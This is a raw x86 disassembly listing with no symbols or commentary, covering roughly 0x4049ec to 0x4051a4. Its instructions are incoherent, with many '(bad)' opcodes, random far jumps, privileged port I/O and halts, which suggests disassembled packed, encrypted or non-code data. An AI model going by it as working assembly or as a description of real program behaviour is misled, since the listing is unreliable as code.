  4049ec:	call   0x42fb:0x49715f61
  4049f3:	push   ecx
  4049f4:	lock pushf 
  4049f6:	mov    eax,eax
  4049f8:	outs   dx,DWORD PTR ds:[esi]
  4049f9:	addr16 push eax
  4049fc:	nop
  4049fd:	xchg   BYTE PTR [ebp+ebx*4-0x524f002f],ch
  404a04:	xor    BYTE PTR [ebx+0x58b7682],ah
  404a0a:	inc    esi
  404a0b:	mov    eax,ds:0x8c6af22a
  404a10:	ds jg  0x404a91
  404a13:	cmp    cl,bl
  404a15:	jae    0x404a7d
  404a17:	inc    esi
  404a18:	fidiv  WORD PTR ds:0xa8bdf8a6
  404a1e:	dec    edi
  404a1f:	ror    DWORD PTR [ebx+ebp*8-0x57424e09],0xaf
  404a27:	cmp    al,0x14
  404a29:	ret    
  404a2a:	fwait
  404a2b:	xor    BYTE PTR [edx],bh
  404a2d:	pop    eax
  404a2e:	out    0xc7,eax
  404a30:	iret   
  404a31:	or     eax,0xbbd60606
  404a36:	lds    esp,FWORD PTR [edi+0x30]
  404a39:	push   cs
  404a3a:	or     eax,0x73c9be92
  404a3f:	test   al,0xe8
  404a41:	loopne 0x4049ed
  404a43:	iret   
  404a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a45:	stos   DWORD PTR es:[edi],eax
  404a46:	outs   dx,BYTE PTR ds:[esi]
  404a47:	dec    DWORD PTR [edi+0x7]
  404a4a:	jp     0x404aba
  404a4c:	mov    ?,WORD PTR [esi+0x7f]
  404a4f:	loop   0x404a03
  404a51:	lods   eax,DWORD PTR ds:[esi]
  404a52:	mov    dh,0x8e
  404a54:	stos   BYTE PTR es:[edi],al
  404a55:	cli    
  404a56:	adc    eax,0x9187b614
  404a5b:	inc    ecx
  404a5c:	and    al,0x5e
  404a5e:	push   cs
  404a5f:	push   ebx
  404a60:	or     eax,0x45c1984a
  404a65:	test   al,0x97
  404a67:	mov    ss,WORD PTR [eax-0x6]
  404a6a:	jg     0x404abf
  404a6c:	aaa    
  404a6d:	jae    0x404ac3
  404a6f:	fbstp  TBYTE PTR [ebp+0x1d]
  404a72:	push   ebx
  404a73:	dec    ecx
  404a74:	call   0xaa28:0x1de9ece6
  404a7b:	mov    al,0xd7
  404a7d:	push   0xb99213f
  404a82:	sub    cl,0x15
  404a85:	jecxz  0x404ab7
  404a87:	sbb    al,0xe
  404a89:	or     al,0x9b
  404a8b:	lods   eax,DWORD PTR ds:[esi]
  404a8c:	jno    0x404a47
  404a8e:	dec    esi
  404a8f:	lods   al,BYTE PTR ds:[esi]
  404a90:	mov    esp,0xdf96ab9f
  404a95:	lds    edx,FWORD PTR [ecx]
  404a97:	push   ebp
  404a98:	in     al,0xc3
  404a9a:	jecxz  0x404a55
  404a9c:	iret   
  404a9d:	pop    edx
  404a9e:	fsub   DWORD PTR [ebx-0x1507f3b4]
  404aa4:	push   edx
  404aa5:	inc    DWORD PTR [ecx+0x4]
  404aa8:	mov    bh,0xdf
  404aaa:	fnstenv [eax-0x46]
  404aad:	shr    dl,0x51
  404ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ab1:	bnd jge 0x404a3e
  404ab4:	sub    BYTE PTR [esi+ecx*1],bl
  404ab7:	mov    WORD PTR [edi],ss
  404ab9:	push   ds
  404aba:	in     eax,0x98
  404abc:	mov    eax,0xbd34cf9
  404ac1:	in     al,dx
  404ac2:	addr16 inc edi
  404ac4:	pop    ebx
  404ac5:	push   0x22
  404ac7:	stos   DWORD PTR es:[edi],eax
  404ac8:	jo     0x404afd
  404aca:	mov    ebp,0xee3027e1
  404acf:	and    eax,0x7d46382a
  404ad4:	jae    0x404b30
  404ad6:	dec    ebp
  404ad7:	(bad)
  404adb:	dec    edx
  404adc:	dec    edx
  404add:	xor    al,0x50
  404adf:	stos   DWORD PTR es:[edi],eax
  404ae0:	iret   
  404ae1:	enter  0xced9,0x29
  404ae5:	jge    0x404ab0
  404ae7:	xor    al,0xb2
  404ae9:	inc    edi
  404aea:	push   ds
  404aeb:	popa   
  404aec:	es pushf 
  404aee:	outs   dx,BYTE PTR ds:[esi]
  404aef:	jge    0x404afe
  404af1:	lock pusha 
  404af3:	or     al,0xc2
  404af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404af6:	push   edx
  404af7:	sti    
  404af8:	dec    ebp
  404af9:	cdq    
  404afa:	out    0x1c,al
  404afc:	xor    DWORD PTR [eax+0x2724ed56],edi
  404b02:	fidivr WORD PTR [edx-0x9]
  404b05:	out    dx,al
  404b06:	jns    0x404b22
  404b08:	fadd   DWORD PTR [edx-0x5b679176]
  404b0e:	sbb    DWORD PTR [edi-0x3e],eax
  404b11:	sub    bh,0x3c
  404b14:	les    esi,FWORD PTR [eax]
  404b16:	lock xor bl,ah
  404b19:	adc    eax,0x653f925b
  404b1e:	sub    dh,dh
  404b20:	fisub  DWORD PTR [eax+0x4b]
  404b23:	or     esi,ebx
  404b25:	and    DWORD PTR [eax+0x7c97de],0xc3eba76d
  404b2f:	push   ecx
  404b30:	jle    0x404ae4
  404b32:	rcr    bh,cl
  404b34:	pop    ebp
  404b35:	mov    ds:0xfd350b86,eax
  404b3a:	xchg   esi,eax
  404b3b:	(bad)  
  404b3c:	xchg   ecx,eax
  404b3d:	pop    ds
  404b3e:	arpl   WORD PTR [eax],bx
  404b40:	push   eax
  404b41:	dec    eax
  404b42:	cmp    DWORD PTR [ecx],esp
  404b44:	sbb    BYTE PTR [edx],dl
  404b46:	mov    cl,0x10
  404b48:	mov    ss,esi
  404b4a:	and    eax,0xb511bd5
  404b4f:	pop    edi
  404b50:	js     0x404b7f
  404b52:	ins    BYTE PTR es:[edi],dx
  404b53:	(bad)  
  404b54:	jmp    0x5314:0xb9d71e72
  404b5b:	pusha  
  404b5c:	out    dx,eax
  404b5d:	adc    dh,BYTE PTR [edx+0x6b]
  404b60:	lea    eax,[edx+edi*2]
  404b63:	outs   dx,DWORD PTR ds:[esi]
  404b64:	lds    ebp,FWORD PTR [edx]
  404b66:	mov    bh,dh
  404b68:	mov    ss,edx
  404b6a:	loop   0x404b3b
  404b6c:	cmp    BYTE PTR [esi+ebp*4+0x24],dh
  404b70:	sti    
  404b71:	push   es
  404b72:	mov    ecx,0xffb261a3
  404b77:	cmp    bl,dh
  404b79:	fs or  eax,0xb1ac6d79
  404b7f:	xchg   esp,eax
  404b80:	cmp    ebp,DWORD PTR [ebx]
  404b82:	mov    esp,DWORD PTR [ebx]
  404b84:	sbb    dh,BYTE PTR [edx+0x3b]
  404b87:	sbb    esi,ebp
  404b89:	pusha  
  404b8a:	sar    BYTE PTR [ebx+0x565afd30],1
  404b90:	sub    BYTE PTR [ebp+0x42611447],0xa
  404b97:	fdivr  DWORD PTR [ebx-0x54]
  404b9a:	dec    ebp
  404b9b:	xor    DWORD PTR [esi+0x4425a1b2],edx
  404ba1:	faddp  st(0),st
  404ba3:	ins    BYTE PTR es:[edi],dx
  404ba4:	push   es
  404ba5:	xor    BYTE PTR [ebp-0x60],0x86
  404ba9:	icebp  
  404baa:	inc    ebx
  404bab:	xchg   ecx,eax
  404bac:	mov    esp,DWORD PTR [ebx-0x2f]
  404baf:	jg     0x404c02
  404bb1:	adc    BYTE PTR [ecx+0x21],bh
  404bb4:	pop    ebx
  404bb5:	jmp    0xfbb97978
  404bba:	push   esi
  404bbb:	imul   edi,ebp,0xffffffc3
  404bbe:	xchg   edi,eax
  404bbf:	push   ss
  404bc0:	in     al,0x94
  404bc2:	imul   esi,DWORD PTR [edx],0x5de63695
  404bc8:	in     al,0x40
  404bca:	adc    ecx,0xffffff8f
  404bcd:	fcom   QWORD PTR [esi+0x13]
  404bd0:	stos   BYTE PTR es:[edi],al
  404bd1:	(bad)  
  404bd2:	das    
  404bd3:	popa   
  404bd4:	dec    edx
  404bd5:	imul   esi,DWORD PTR [edx-0x15],0xd92c0dd9
  404bdc:	loopne 0x404bae
  404bde:	xlat   BYTE PTR ds:[ebx]
  404bdf:	sbb    bl,BYTE PTR [ecx]
  404be1:	pop    ebx
  404be2:	mov    al,0x2d
  404be4:	fnstcw WORD PTR [ecx-0x68a4a75b]
  404bea:	das    
  404beb:	mov    cl,0x7e
  404bed:	mov    cl,0x88
  404bef:	enter  0xaa23,0xa1
  404bf3:	repnz and BYTE PTR [ebx-0x45ee717a],0xbb
  404bfb:	pop    esp
  404bfc:	outs   dx,BYTE PTR ds:[esi]
  404bfd:	hlt    
  404bfe:	icebp  
  404bff:	cmp    eax,0xefde8428
  404c04:	pushf  
  404c05:	and    eax,0x1bc4145e
  404c0a:	xor    al,0x97
  404c0c:	adc    al,0x26
  404c0e:	mov    BYTE PTR [ebx+0x41],bl
  404c11:	push   es
  404c12:	cmc    
  404c13:	jns    0x404c31
  404c15:	inc    esi
  404c16:	imul   ebx,DWORD PTR [esi],0xffffffc5
  404c19:	xchg   esi,eax
  404c1a:	inc    eax
  404c1b:	and    DWORD PTR [edx+0x15be7ede],0x389493f3
  404c25:	mov    ebx,0x9caea7f7
  404c2a:	xor    bh,BYTE PTR [ecx+0x7be76bf0]
  404c30:	out    0x87,eax
  404c32:	ror    BYTE PTR [ebp+0x22],1
  404c35:	call   0x72514e88
  404c3a:	sub    edx,DWORD PTR ds:0x9ab86360
  404c40:	jae    0x404cbf
  404c42:	mov    dl,0xd0
  404c44:	ss jb  0x404c86
  404c47:	bound  ecx,QWORD PTR ds:0x63302e85
  404c4d:	ror    DWORD PTR [edx-0x3f],1
  404c50:	pusha  
  404c51:	lahf   
  404c52:	lds    esp,FWORD PTR [eax]
  404c54:	cmp    ecx,DWORD PTR [esp+esi*4-0x1094a8d3]
  404c5b:	scas   eax,DWORD PTR es:[edi]
  404c5c:	xor    BYTE PTR [ebp-0x7567d87f],ch
  404c62:	mov    esi,0x5137d3d0
  404c67:	lods   eax,DWORD PTR ds:[esi]
  404c68:	xchg   ecx,eax
  404c69:	adc    cl,BYTE PTR [ebp+0x7d]
  404c6c:	mov    ah,0xa9
  404c6e:	jne    0x404bf9
  404c70:	mov    ds:0xd9297a72,eax
  404c75:	inc    edx
  404c76:	cmp    BYTE PTR [eax-0x1b14ef1b],bl
  404c7c:	sbb    BYTE PTR [ebx-0x7e14ab98],ah
  404c82:	pop    esp
  404c83:	ins    DWORD PTR es:[edi],dx
  404c84:	outs   dx,DWORD PTR ds:[esi]
  404c85:	jbe    0x404c22
  404c87:	pop    esi
  404c88:	mov    BYTE PTR [esi+0x57],dl
  404c8b:	sbb    cl,BYTE PTR [ecx]
  404c8d:	mov    ah,0xa8
  404c8f:	fwait
  404c90:	mov    WORD PTR [edi+0x3c98089b],?
  404c96:	mov    ds:0x5eb614ee,eax
  404c9b:	jae    0x404c9b
  404c9d:	cmp    BYTE PTR [ecx],bl
  404c9f:	aad    0x11
  404ca1:	jle    0x404c7f
  404ca3:	mov    WORD PTR [esi-0x54e2eb89],cs
  404ca9:	(bad)  
  404caa:	sbb    al,0xd3
  404cac:	jo     0x404d16
  404cae:	mov    BYTE PTR [ebp-0x1dbbd9a5],bh
  404cb4:	xchg   ebp,eax
  404cb5:	push   0xacdae2d9
  404cba:	jmp    0xd8d7:0x4e80b9bb
  404cc1:	adc    al,0xe8
  404cc3:	and    edx,DWORD PTR [edi]
  404cc5:	lock repz in al,0x3f
  404cc9:	and    BYTE PTR [esp+esi*8+0x2cc0ea62],ah
  404cd0:	push   0xffffff8a
  404cd2:	repnz dec eax
  404cd4:	outs   dx,BYTE PTR ds:[esi]
  404cd5:	push   ebp
  404cd6:	sbb    bh,dl
  404cd8:	sbb    eax,0xdaa530e7
  404cdd:	inc    eax
  404cde:	dec    BYTE PTR [eax-0x6de98b61]
  404ce4:	cwde   
  404ce5:	sahf   
  404ce6:	push   ebx
  404ce7:	loopne 0x404ce4
  404ce9:	add    eax,0xe5061a5e
  404cee:	in     eax,dx
  404cef:	jmp    0x88c0636b
  404cf4:	es call 0x817f:0x388a6486
  404cfc:	lea    edi,[ebx]
  404cfe:	mov    WORD PTR [ecx-0x4123027e],fs
  404d04:	daa    
  404d05:	push   ebp
  404d06:	call   0x9870:0xa105b920
  404d0d:	pushf  
  404d0e:	ins    BYTE PTR es:[edi],dx
  404d0f:	mul    BYTE PTR [edi]
  404d11:	add    DWORD PTR [eax+0x6c],edi
  404d14:	fld    TBYTE PTR [esi]
  404d16:	imul   ecx,ecx,0xfacc0d14
  404d1c:	jne    0x404d60
  404d1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d1f:	scas   al,BYTE PTR es:[edi]
  404d20:	sbb    dh,BYTE PTR [ebp-0x6571f6c4]
  404d26:	or     al,0xba
  404d28:	out    0x98,eax
  404d2a:	test   ebp,ecx
  404d2c:	call   FWORD PTR [edx]
  404d2e:	pop    esi
  404d2f:	loopne 0x404cf2
  404d31:	es test eax,0x5ae6b067
  404d37:	int3   
  404d38:	jae    0x404d6d
  404d3a:	fs daa 
  404d3c:	outs   dx,BYTE PTR ds:[esi]
  404d3d:	(bad)  
  404d3e:	push   ss
  404d3f:	int    0x24
  404d41:	lahf   
  404d42:	xor    bh,BYTE PTR [esi+0x5462f2f4]
  404d48:	lock sbb BYTE PTR [ecx-0x2fe2c0d5],cl
  404d4f:	fcmovbe st,st(5)
  404d51:	jns    0x404d6b
  404d53:	mov    dh,0xda
  404d55:	(bad)  ds:0x11154524
  404d5b:	jo     0x404daa
  404d5d:	popf   
  404d5e:	sub    BYTE PTR [esi+0x4c],bh
  404d61:	test   BYTE PTR [edx],ch
  404d63:	inc    edx
  404d64:	stos   DWORD PTR es:[edi],eax
  404d65:	push   edx
  404d66:	xor    ecx,eax
  404d68:	les    esp,FWORD PTR [eax-0x64]
  404d6b:	retf   
  404d6c:	mov    eax,ds:0x669c9858
  404d71:	inc    esi
  404d72:	cmp    dl,BYTE PTR [ecx]
  404d74:	(bad)
  404d78:	fxam   
  404d7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d7b:	imul   BYTE PTR [ecx+0x6f46564e]
  404d81:	(bad)  
  404d82:	repz jmp 0xcb3c1a1e
  404d88:	push   ecx
  404d89:	lea    ebp,[edx+eiz*4]
  404d8c:	aas    
  404d8d:	xchg   edi,eax
  404d8e:	fsubr  QWORD PTR [esi+0x6a]
  404d91:	and    eax,0xec138dbc
  404d96:	arpl   WORD PTR [eax+0x4a],di
  404d99:	sbb    al,0x90
  404d9b:	sub    edx,esp
  404d9d:	popf   
  404d9e:	out    0xce,eax
  404da0:	(bad)  
  404da1:	fs pop edx
  404da3:	xchg   esi,ebp
  404da5:	xchg   ebp,eax
  404da6:	lahf   
  404da7:	mov    ebx,esp
  404da9:	add    eax,0xcdc149bb
  404dae:	adc    al,0xa0
  404db0:	aas    
  404db1:	fcmove st,st(5)
  404db3:	or     dl,BYTE PTR [esp+esi*2-0x170ca5ce]
  404dba:	shl    BYTE PTR cs:[edi+edx*8],cl
  404dbe:	ret    
  404dbf:	hlt    
  404dc0:	in     al,0x86
  404dc2:	mov    al,ds:0x9337ddb0
  404dc7:	xor    al,0xf9
  404dc9:	or     al,0xc3
  404dcb:	mov    ecx,0x1481d5af
  404dd0:	out    dx,eax
  404dd1:	mov    esi,0x30966e1b
  404dd6:	cmp    BYTE PTR [ebx+0x7],bh
  404dd9:	mov    bh,0xfc
  404ddb:	sub    dh,BYTE PTR [ebx+eax*8]
  404dde:	jb     0x404d77
  404de0:	or     BYTE PTR [ebp-0x4894e1d],al
  404de6:	clc    
  404de7:	dec    ebp
  404de8:	sub    BYTE PTR [eax-0x77],ah
  404deb:	or     al,0x84
  404ded:	mov    ds:0xf44e6956,eax
  404df2:	fstp   QWORD PTR [ecx+0x46]
  404df5:	(bad)
  404df9:	dec    ebp
  404dfa:	sub    al,0x73
  404dfc:	sub    bl,al
  404dfe:	les    edx,FWORD PTR [ebp+0xb0d77b4]
  404e04:	loopne 0x404de8
  404e06:	xor    eax,0xd323948a
  404e0b:	and    bh,cl
  404e0d:	xchg   esi,eax
  404e0e:	dec    ecx
  404e0f:	int3   
  404e10:	ret    0xf2f2
  404e13:	push   0xffffffc9
  404e15:	out    0x25,eax
  404e17:	inc    ebx
  404e18:	fwait
  404e19:	xor    BYTE PTR [edx+0x4c],al
  404e1c:	iret   
  404e1d:	sar    bh,cl
  404e1f:	xchg   edi,eax
  404e20:	sbb    dh,cl
  404e22:	jp     0x404e36
  404e24:	xor    BYTE PTR [edi+0x34],dh
  404e27:	jge    0x404df9
  404e29:	lahf   
  404e2a:	(bad)  
  404e2b:	(bad)  
  404e2d:	sbb    ch,BYTE PTR [esi]
  404e2f:	push   ds
  404e30:	mov    WORD PTR [edi-0x68],?
  404e33:	cli    
  404e34:	leave  
  404e35:	push   ebp
  404e36:	cmp    cl,0x25
  404e39:	inc    ebx
  404e3a:	jge    0x404dfd
  404e3c:	mov    dh,0x14
  404e3e:	dec    eax
  404e3f:	inc    edx
  404e40:	lahf   
  404e41:	sbb    edi,DWORD PTR [edi+0x1f]
  404e44:	xchg   ecx,eax
  404e45:	inc    eax
  404e46:	imul   ecx,DWORD PTR [edx+0xb],0x95ad4442
  404e4d:	popf   
  404e4e:	imul   cx,WORD PTR [ecx+0x0],0x58
  404e53:	test   eax,0x2715f37a
  404e58:	loopne 0x404de2
  404e5a:	iret   
  404e5b:	je     0x404e96
  404e5d:	mov    bh,0xb0
  404e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e60:	jae    0x404de8
  404e62:	add    cl,cl
  404e64:	(bad)  
  404e65:	call   0x52faa1b6
  404e6a:	int3   
  404e6b:	dec    ecx
  404e6c:	push   ebx
  404e6d:	mov    ds:0xe64fefb5,eax
  404e72:	icebp  
  404e73:	sub    al,0x81
  404e75:	add    eax,0x2bca53d1
  404e7a:	loop   0x404e52
  404e7c:	in     eax,0x24
  404e7e:	imul   esi,DWORD PTR [ecx+ebx*8+0x25d5fcb0],0x6d0825b8
  404e89:	inc    eax
  404e8a:	jo     0x404e88
  404e8c:	bound  esi,QWORD PTR [edi+0x40]
  404e8f:	xlat   BYTE PTR ds:[ebx]
  404e90:	shl    DWORD PTR [eax-0x5f42c93],0x91
  404e97:	daa    
  404e98:	and    BYTE PTR [ebp+0xefa02b0],bh
  404e9e:	inc    edx
  404e9f:	jns    0x404e94
  404ea1:	add    edi,DWORD PTR [edi-0x5d21ee7f]
  404ea7:	mov    dl,0x24
  404ea9:	setle  BYTE PTR [ecx-0x20]
  404ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eae:	sbb    al,dl
  404eb0:	xchg   ebp,eax
  404eb1:	cmc    
  404eb2:	dec    esp
  404eb3:	ficomp WORD PTR [edi+0x23dab56e]
  404eb9:	cwde   
  404eba:	cli    
  404ebb:	and    cl,cl
  404ebd:	fild   DWORD PTR [ebp+0x7a8eb22e]
  404ec3:	fwait
  404ec4:	out    0xd9,eax
  404ec6:	loope  0x404f11
  404ec8:	out    0x96,al
  404eca:	ins    DWORD PTR es:[edi],dx
  404ecb:	xor    edi,esp
  404ecd:	adc    dl,BYTE PTR [esi+0x2cda5bd6]
  404ed3:	imul   edx,DWORD PTR [esi],0xffffffb8
  404ed6:	push   esp
  404ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ed8:	dec    eax
  404ed9:	lods   al,BYTE PTR ds:[esi]
  404eda:	mov    dl,0xed
  404edc:	pop    ds
  404edd:	dec    ecx
  404ede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404edf:	mov    eax,ds:0x961957e0
  404ee4:	cmp    al,0xb3
  404ee6:	mov    ah,0xd8
  404ee8:	mov    eax,DWORD PTR [esi-0x22]
  404eeb:	jmp    0xcb55:0x6f8d023
  404ef2:	mov    cl,0x2b
  404ef4:	imul   edi,DWORD PTR ds:[ebx+0x41bdd3],0xa47a2c4b
  404eff:	push   ss
  404f00:	push   cs
  404f01:	ret    0xe0aa
  404f04:	add    eax,0xe56634cb
  404f09:	cld    
  404f0a:	jns    0x404eb3
  404f0c:	pop    edi
  404f0d:	jp     0x404edb
  404f0f:	pusha  
  404f10:	xchg   ah,ah
  404f12:	mov    esi,ebp
  404f14:	add    DWORD PTR [edi],edx
  404f16:	adc    cl,cl
  404f18:	imul   ecx,DWORD PTR [eax],0x42
  404f1b:	rcl    DWORD PTR [eax],0x78
  404f1e:	jmp    0x4d3289ef
  404f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f24:	xchg   ebx,eax
  404f25:	mov    fs,WORD PTR [ebx]
  404f27:	(bad)  
  404f28:	in     eax,dx
  404f29:	mov    esp,0x692e122b
  404f2e:	xchg   esi,eax
  404f2f:	sbb    DWORD PTR ss:[eax],esp
  404f32:	or     dl,BYTE PTR [edx+ebp*2+0x5]
  404f36:	cmp    eax,0xfeed2feb
  404f3b:	pop    ax
  404f3d:	inc    ecx
  404f3e:	mov    ecx,DWORD PTR [esi]
  404f40:	sub    BYTE PTR [esp+edx*1-0x56],0xfa
  404f45:	jns    0x404f81
  404f47:	mov    BYTE PTR [ebx],dh
  404f49:	cli    
  404f4a:	imul   esi,ebx,0x72
  404f4d:	sbb    bl,dl
  404f4f:	ins    BYTE PTR es:[edi],dx
  404f50:	(bad)  
  404f51:	fs fwait
  404f53:	xchg   edx,eax
  404f54:	sbb    ebp,DWORD PTR ds:0xd600badd
  404f5a:	jbe    0x404f79
  404f5c:	icebp  
  404f5d:	jge    0x404f76
  404f5f:	sub    eax,0xc3a6e7d9
  404f64:	pop    eax
  404f65:	cmp    ah,BYTE PTR [eax+0x5f1ad03b]
  404f6b:	jecxz  0x404f04
  404f6d:	and    eax,0xbc271ff4
  404f72:	dec    esi
  404f73:	outs   dx,DWORD PTR ds:[esi]
  404f74:	or     eax,0xa02d6145
  404f79:	aaa    
  404f7a:	push   edi
  404f7b:	in     eax,dx
  404f7c:	dec    esi
  404f7d:	nop
  404f7e:	cli    
  404f7f:	pop    edi
  404f80:	sub    eax,0x16631b82
  404f85:	xor    cl,BYTE PTR [esp+esi*1+0x4a2d25e7]
  404f8c:	sub    DWORD PTR [edi+0x43],ecx
  404f8f:	add    edx,DWORD PTR [esi+0x14c5fc7e]
  404f95:	jmp    0x404ff9
  404f97:	ins    DWORD PTR es:[edi],dx
  404f98:	sar    ah,0x73
  404f9b:	xchg   ebx,eax
  404f9c:	jmp    0x404fd6
  404f9e:	scas   eax,DWORD PTR es:[edi]
  404f9f:	lahf   
  404fa0:	std    
  404fa1:	pop    ss
  404fa2:	div    DWORD PTR [edx-0x272a40f9]
  404fa8:	ds adc eax,0x4b81f981
  404fae:	add    DWORD PTR [esi+0x46d1c9f2],0xbef733f
  404fb8:	mov    esp,0xfe877010
  404fbd:	fdiv   DWORD PTR [ebx+eiz*4]
  404fc0:	inc    esi
  404fc1:	(bad)  
  404fc2:	push   ecx
  404fc3:	or     bl,BYTE PTR [esi-0x58a6226d]
  404fc9:	arpl   WORD PTR [ebp+edx*8-0x55ee4b7f],bp
  404fd0:	push   0x3d
  404fd2:	inc    esp
  404fd3:	lods   al,BYTE PTR ds:[esi]
  404fd4:	out    0x40,al
  404fd6:	cmp    al,ch
  404fd8:	cmc    
  404fd9:	test   al,0xac
  404fdb:	add    BYTE PTR [ebp+edi*8+0x3206d2a],0x72
  404fe3:	dec    edx
  404fe4:	rcl    BYTE PTR [edx+eax*8-0x5a076de2],0x9c
  404fec:	mov    al,ds:0x48d4fa7
  404ff1:	jns    0x404f94
  404ff3:	inc    ecx
  404ff4:	inc    edi
  404ff5:	add    al,BYTE PTR [eax+0x7dbd6e1e]
  404ffb:	ds mov dh,0xf9
  404ffe:	in     eax,0x67
  405000:	out    0x23,al
  405002:	inc    edi
  405003:	push   edx
  405004:	jecxz  0x40503a
  405006:	inc    ecx
  405007:	(bad)  
  405008:	nop
  405009:	int3   
  40500a:	jle    0x405076
  40500c:	xchg   esi,eax
  40500d:	pop    ecx
  40500e:	adc    DWORD PTR [ebp+0x7f6aa984],eax
  405014:	push   edx
  405015:	ficom  DWORD PTR [esi]
  405017:	test   eax,0xe10a1293
  40501c:	mov    eax,0x471506fc
  405021:	xchg   BYTE PTR [edx-0x6f2e0c65],al
  405027:	and    ah,BYTE PTR [eax-0x63]
  40502a:	les    ecx,FWORD PTR [ebx]
  40502c:	ror    DWORD PTR ds:0x52382f74,cl
  405032:	jl     0x404fb5
  405034:	nop
  405035:	mov    BYTE PTR [eax-0x3],0xb7
  405039:	add    ch,bl
  40503b:	lock add ah,BYTE PTR [edi]
  40503e:	test   eax,0xf478d2f2
  405043:	js     0x4050a6
  405045:	dec    ecx
  405046:	mov    bl,0x33
  405048:	pop    ebp
  405049:	sbb    esp,ecx
  40504b:	fcomi  st,st(7)
  40504d:	jno    0x404ff3
  40504f:	xchg   esi,eax
  405050:	icebp  
  405051:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405052:	xor    eax,ebx
  405054:	repz push esp
  405056:	cmp    DWORD PTR [edx],esp
  405058:	dec    ebp
  405059:	ins    DWORD PTR es:[edi],dx
  40505a:	adc    edx,DWORD PTR [ebp-0x51268f07]
  405060:	ss xchg ebx,eax
  405062:	outs   dx,BYTE PTR ds:[esi]
  405063:	or     eax,ecx
  405065:	jnp    0x40504e
  405067:	and    dh,dh
  405069:	adc    eax,0x5376ac5f
  40506e:	xor    al,0x8a
  405070:	je     0x40508a
  405072:	fprem1 
  405074:	fmul   QWORD PTR [ebx+0x1f1611e4]
  40507a:	outs   dx,DWORD PTR ds:[esi]
  40507b:	icebp  
  40507c:	xchg   ebx,eax
  40507d:	inc    ecx
  40507e:	pop    ecx
  40507f:	and    DWORD PTR [edx-0x76],0xffffffd5
  405083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405084:	ret    0x951b
  405087:	dec    eax
  405088:	shr    BYTE PTR [edi+eax*2],0xff
  40508c:	add    edx,DWORD PTR [ebx+0x58]
  40508f:	das    
  405090:	and    cl,BYTE PTR [ebx+0x23]
  405093:	clc    
  405094:	gs pusha 
  405096:	and    al,0xe4
  405098:	(bad)  
  405099:	retf   0x7bd
  40509c:	mov    esp,0x5550fc4d
  4050a1:	or     al,0xfb
  4050a3:	in     eax,0xd
  4050a5:	int    0xc3
  4050a7:	xchg   BYTE PTR [ebx],dl
  4050a9:	jae    0x405098
  4050ab:	mov    eax,0x4f9525c6
  4050b0:	mov    dh,0x8a
  4050b2:	jno    0x40511f
  4050b4:	xor    al,BYTE PTR cs:[edi]
  4050b7:	cmp    ecx,DWORD PTR [ebx]
  4050b9:	mov    ecx,0x21db6fe3
  4050be:	imul   eax,esp,0x7c
  4050c1:	sbb    edx,esi
  4050c3:	and    DWORD PTR [esi+0x28],edi
  4050c6:	iret   
  4050c7:	enter  0xe66f,0x7f
  4050cb:	pop    ds
  4050cc:	and    DWORD PTR [ebp+0x22011cf9],ebx
  4050d2:	enter  0x108,0xc4
  4050d6:	push   esi
  4050d7:	mov    edi,0xa72e30fd
  4050dc:	pop    esi
  4050dd:	xor    al,0x29
  4050df:	or     ebp,DWORD PTR [ebx+0x20f4bd03]
  4050e5:	jmp    0x9cef:0x53499e6f
  4050ec:	aas    
  4050ed:	fs jno 0x405099
  4050f0:	gs loopne 0x405150
  4050f3:	jp     0x4050f0
  4050f5:	repnz inc ebp
  4050f7:	stc    
  4050f8:	dec    esi
  4050f9:	nop
  4050fa:	mul    bh
  4050fc:	scas   eax,DWORD PTR es:[edi]
  4050fd:	mov    gs,esi
  4050ff:	and    eax,0x45d79f9c
  405104:	shl    esi,cl
  405106:	push   0xca111e5d
  40510b:	stc    
  40510c:	pop    eax
  40510d:	or     cl,BYTE PTR [edx-0x36]
  405110:	or     al,0x63
  405112:	and    esi,edi
  405114:	cmp    al,0xd8
  405116:	cmp    ebp,DWORD PTR [ebx+0x7f]
  405119:	les    edx,FWORD PTR [ebp+ebx*2+0x5e]
  40511d:	mov    ds:0x4daa2e62,al
  405122:	fcomp  st(4)
  405124:	push   ebp
  405125:	call   0xf32f9dc2
  40512a:	(bad)  
  40512b:	in     eax,dx
  40512c:	xchg   ebp,esp
  40512e:	lods   eax,DWORD PTR ds:[esi]
  40512f:	jb     0x40516b
  405131:	pop    es
  405132:	mov    bh,0xd4
  405134:	xchg   esi,eax
  405135:	mov    ah,0xe1
  405137:	jl     0x4050b9
  405139:	jl     0x4050e6
  40513b:	stc    
  40513c:	pop    ds
  40513d:	xor    eax,0xa72998a0
  405142:	fild   WORD PTR [ebx+0x76]
  405145:	dec    esi
  405146:	jg     0x405120
  405148:	mov    edx,0x27b1b0fc
  40514d:	sbb    ebp,ebx
  40514f:	xchg   esp,eax
  405150:	inc    esi
  405151:	mov    bl,BYTE PTR [ebp+0x29b79d89]
  405157:	xor    BYTE PTR [edi],0xc7
  40515a:	call   0x6f99:0x9a929aed
  405161:	lds    edi,FWORD PTR [eax-0x4d0ce632]
  405167:	xchg   esi,eax
  405168:	inc    eax
  405169:	fs jecxz 0x40517b
  40516c:	inc    edi
  40516d:	fmul   QWORD PTR [edi-0x548b61a4]
  405173:	jno    0x4051a4
  405175:	mov    gs,WORD PTR [ebx]
  405177:	push   ebp
  405178:	retf   
  405179:	jb     0x4051d5
  40517b:	fld    QWORD PTR [eax-0x71]
  40517e:	test   DWORD PTR [esi-0x64b13225],0x103bd240
  405188:	mov    ds:0x41c41861,al
  40518d:	adc    al,0x85
  40518f:	icebp  
  405190:	in     al,0x40
  405192:	add    eax,0x562a18d1
  405197:	push   es
  405198:	mov    al,ds:0xf03be468
  40519d:	dec    BYTE PTR [esi]
  40519f:	mov    dl,0x54
  4051a1:	cdq    
  4051a2:	jp     0x4051e6
  4051a4:	data16 xor bh,0xea
